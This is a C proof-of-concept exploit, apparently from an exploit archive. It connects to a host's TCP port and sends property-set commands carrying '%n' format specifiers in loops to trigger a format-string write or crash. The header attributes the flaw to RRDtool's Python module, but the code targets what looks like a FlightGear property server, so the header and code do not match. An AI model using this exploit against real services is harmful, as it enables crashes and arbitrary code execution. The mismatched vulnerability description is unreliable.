/*
source: http://www.securityfocus.com/bid/60004/info

The RRDtool module for Python is prone to a format-string vulnerability because it fails to properly sanitize user-supplied input.

An attacker may exploit this issue to execute arbitrary code within the context of the affected application or to crash the application.

RRDtool 1.4.7 is affected; other versions may also be vulnerable. 
*/

#include <stdio.h>  
#include <errno.h>  
#include <stdlib.h>  
#include <unistd.h>  
#include <sys/time.h>  
#include <sys/types.h>  
#include <sys/socket.h>  
#include <netdb.h>  
#include <netinet/in.h>  
#include <stdarg.h>  
#include <string.h>  
#define DFLTHOST     "www.example.com"  
#define DFLTPORT     5501  
#define MAXMSG          256  
#define fgfsclose     close  
void init_sockaddr(struct sockaddr_in *name, const char *hostname, unsigned port);  
int fgfswrite(int sock, char *msg, ...);  
const char *fgfsread(int sock, int wait);  
void fgfsflush(int sock);  
int fgfswrite(int sock, char *msg, ...)  
{  
  va_list va;  
  ssize_t len;  
  char buf[MAXMSG];  
  va_start(va, msg);  
  vsnprintf(buf, MAXMSG - 2, msg, va);  
  va_end(va);  
  printf("SEND: \t<%s>\n", buf);  
  strcat(buf, "\015\012");  
  len = write(sock, buf, strlen(buf));  
  if (len < 0) {  
       perror("fgfswrite");  
       exit(EXIT_FAILURE);  
  }  
  return len;  
}  
const char *fgfsread(int sock, int timeout)  
{  
  static char buf[MAXMSG];  
  char *p;  
  fd_set ready;  
  struct timeval tv;  
  ssize_t len;  
  FD_ZERO(&ready);  
  FD_SET(sock, &ready);  
  tv.tv_sec = timeout;  
  tv.tv_usec = 0;  
  if (!select(32, &ready, 0, 0, &tv))  
       return NULL;  
  len = read(sock, buf, MAXMSG - 1);  
  if (len < 0) {  
       perror("fgfsread");  
       exit(EXIT_FAILURE);  
  }   
  if (len == 0)  
       return NULL;  
  for (p = &buf[len - 1]; p >= buf; p--)  
       if (*p != '\015' && *p != '\012')  
            break;  
  *++p = '\0';  
  return strlen(buf) ? buf : NULL;  
}  
void fgfsflush(int sock)  
{  
  const char *p;  
  while ((p = fgfsread(sock, 0)) != NULL) {  
       printf("IGNORE: \t<%s>\n", p);  
  }  
}  
int fgfsconnect(const char *hostname, const int port)  
{  
  struct sockaddr_in serv_addr;  
  struct hostent *hostinfo;  
  int sock;  
  sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);  
  if (sock < 0) {  
       perror("fgfsconnect/socket");  
       return -1;  
  }  
  hostinfo = gethostbyname(hostname);  
  if (hostinfo == NULL) {  
       fprintf(stderr, "fgfsconnect: unknown host: \"%s\"\n", hostname);  
       close(sock);  
       return -2;  
  }  
  serv_addr.sin_family = AF_INET;  
  serv_addr.sin_port = htons(port);  
  serv_addr.sin_addr = *(struct in_addr *)hostinfo->h_addr;  
  if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {  
       perror("fgfsconnect/connect");  
       close(sock);  
       return -3;  
  }  
  return sock;  
}  
int main(int argc, char **argv)  
{  
  int sock;  
  unsigned port;  
  const char *hostname, *p;  
 int i;  
  hostname = argc > 1 ? argv[1] : DFLTHOST;  
  port = argc > 2 ? atoi(argv[2]) : DFLTPORT;  
  sock = fgfsconnect(hostname, port);  
  if (sock < 0)  
       return EXIT_FAILURE;  
  fgfswrite(sock, "data");  
 fgfswrite(sock, "set /sim/rendering/clouds3d-enable true");  
 fgfswrite(sock, "set /environment/clouds");  
 for (i=0; i < 5; i++) {  
       fgfswrite(sock, "set /environment/cloudlayers/layers[%d]/cu/cloud/name %%n", i);  
       fgfswrite(sock, "set /environment/cloudlayers/layers[%d]/cb/cloud/name %%n", i);  
       fgfswrite(sock, "set /environment/cloudlayers/layers[%d]/ac/cloud/name %%n", i);  
       fgfswrite(sock, "set /environment/cloudlayers/layers[%d]/st/cloud/name %%n", i);  
       fgfswrite(sock, "set /environment/cloudlayers/layers[%d]/ns/cloud/name %%n", i);  
 }  
  p = fgfsread(sock, 3);  
  if (p != NULL)  
       printf("READ: \t<%s>\n", p);  
 for (i=0; i < 5; i++) {  
       fgfswrite(sock, "set /environment/clouds/layer[%d]/coverage scattered", i);  
       fgfswrite(sock, "set /environment/clouds/layer[%d]/coverage cirrus", i);  
       fgfswrite(sock, "set /environment/clouds/layer[%d]/coverage clear", i);  
 }  
 p = fgfsread(sock, 3);  
  if (p != NULL)  
       printf("READ: \t<%s>\n", p);  
  fgfswrite(sock, "quit");  
  fgfsclose(sock);  
  return EXIT_SUCCESS;  
}